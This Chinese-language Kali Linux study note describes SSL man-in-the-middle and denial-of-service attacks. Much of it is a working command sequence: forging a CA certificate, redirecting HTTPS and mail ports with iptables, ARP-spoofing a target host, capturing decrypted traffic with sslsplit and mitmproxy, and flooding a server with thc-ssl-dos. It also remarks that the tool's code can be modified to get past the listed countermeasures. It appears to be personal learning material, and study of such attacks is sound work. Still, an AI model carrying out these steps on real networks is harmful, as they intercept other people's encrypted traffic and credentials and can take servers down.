❄Kali linux 学习笔记（五十八）Web渗透——SSL（sslsplit、Mitmproxy、sslstrip） 2020.4.2

flechazo · 2021-3-21 · 次阅读








前言


本节学习SSL
secure socket layer


  • 保证网络通信安全的加密协议
  • 1994年netscape开发
  • 1999年TLS取代SSL v3
  • SSL漏洞：heartbleed、POODLE、BEAST

1、简介


SSL/TLS 被用于传输通道加密


  • 邮件传输（SMTP和POP3都是明文传输，需要在服务器间、客户端和服务器之间进行传输加密）
  • 数据库服务器间
  • LDAP（轻量级目录访问协议 X.509）身份认证服务器间
  • SSL VPN
  • 远程桌面 RDP 通信过程中的加密和身份认证

SSL公钥证书


  • verisign
  • thawte
  • globalsign
  • symantec

SSL弱点


  • SSL 是不同的对称、非对称、单向机密算法的组合加密实现（cipher suite）
  • 服务器端为提供更好的兼容性，选择大量过时的 cipher suite
  • 协商过程中强迫降级加密强度
  • 现代处理器计算能力可以在可接受时间内破解过时加密算法
  • 购买云计算资源破解

非对称：RSA、ECC
对称：DES、AES、IDEA、RC4
单向：HASH


2、SSL 中间人攻击


攻击者位于客户端和服务器通信链路中


  • ARP
  • DHCP
  • 修改网关
  • 修改 dns
  • 修改 hosts
  • ICMP、STP、OSPF

攻击的前提


  • 客户端已经信任伪造证书颁发机构
  • 攻击者控制了合法证书颁发机构
  • 客户端控制了合法证书颁发机构
  • 客户端程序禁止了显示证书错误告警信息
  • 攻击者已经控制了客户端，并强制其信任伪造证书

3、sslsplit


  • 透明SSL中间人攻击工具
  • 对客户端伪装成服务器，对服务器伪装成普通客户端
  • 伪装服务器需要伪造证书，需要现在本地生成伪造证书
  • 支持 SSL 加密的 SMTP、POP3、FTP等通信中间人攻击

openssl genrsa -out ca.key 2048 #利用openssl 生成证书私钥
    Generating RSA private key, 2048 bit long modulus

    ...+++
    e is 65537 (0x010001)
#生成ca.key
openssl req -new -x509 -days 1096 -key ca.key -out ca.crt #利用私钥签名生成证书

#成功生成ca.crt
sysctl -w net.ipv4.ip_forward=1 #启动路由功能
iptables -t nat -L -n #查看规则
iptables -t nat -F #如果有规则，怕有影响，清空规则
netstat -tulnp | grep 80
netstat -tulnp | grep 443 #查看 80 和 443 端口是否有占用
# 编写规则
iptables -t nat -A PREROUTING -p tcp –dport 80 -j REDIRECT –to-ports 8080 #发给 80 端口的流量转发给 8080
iptables -t nat -A PREROUTING -p tcp –dport 443 -j REDIRECT –to-ports 8443 #发给 443 端口的流量转发给 8443
iptables -t nat -A PREROUTING -p tcp –dport 587 -j REDIRECT –to-ports 8443 #MSA：邮件提交代理
iptables -t nat -A PREROUTING -p tcp –dport 465 -j REDIRECT –to-ports 8443 #SMTPS：简单邮件传输
iptables -t nat -A PREROUTING -p tcp –dport 993 -j REDIRECT –to-ports 8443 #IMAPS：接收邮件
iptables -t nat -A PREROUTING -p tcp –dport 995 -j REDIRECT –to-ports 8443 #POP3S：邮件传输
iptables -t nat -L -n #再次查看规则
#arp欺骗
arpspoof -i eth0 -t 192.116.1.118 -r 192.116.1.117 #-t指定目标，-r是自己的
#启动 sslsplit 进行攻击
mkdir -p /root/test/logdir/ #创建目录
sslsplit -D -l connect.log -j /root/test -S /root/test/logdir -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 #侦听 8080 和 8443

4、Mitmproxy


#arp 欺骗
arpspoof -i eth0 -t 192.116.1.118 -r 192.116.1.117
#防火墙规则
# Mitmproxy 只支持在 8080 侦听
iptables -t nat -F
iptables -t nat -A PREROUTING -i eth0 -p tcp –dport 80 -j REDIRECT –to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp –dport 443 -j REDIRECT –to-port 8080
# mitmproxy 启动
mitmproxy -T –host -w mitmproxy.log
#信息都在mitmproxy.log

6、SSL拒绝服务攻击


thc-ssl-dos


  • SSL 协商加密对性能开销增加，大量握手请求会导致 DOS
  • 利用 SSL secure Renegotiation 特性，在单一 TCP 连接中生成数千个 SSL 重连接请求，造成服务器资源过载
  • 与流量式拒绝访问攻击不同，thc-ssl-dos 可以利用 dsl 线路打垮 30G 带宽的服务器
  • 服务器平均可以处理 300 次/秒 SSL 握手请求
  • 对 SMTPS、POP3S 等服务同样有效

thc-ssl-dos 192.116.1.118 80 –accept

    对策


    • 禁用 SSL-Renegotiation
    • 使用 SSL Accelerator

    通过修改 thc-ssl-dos 代码，可以绕过以上两种对策
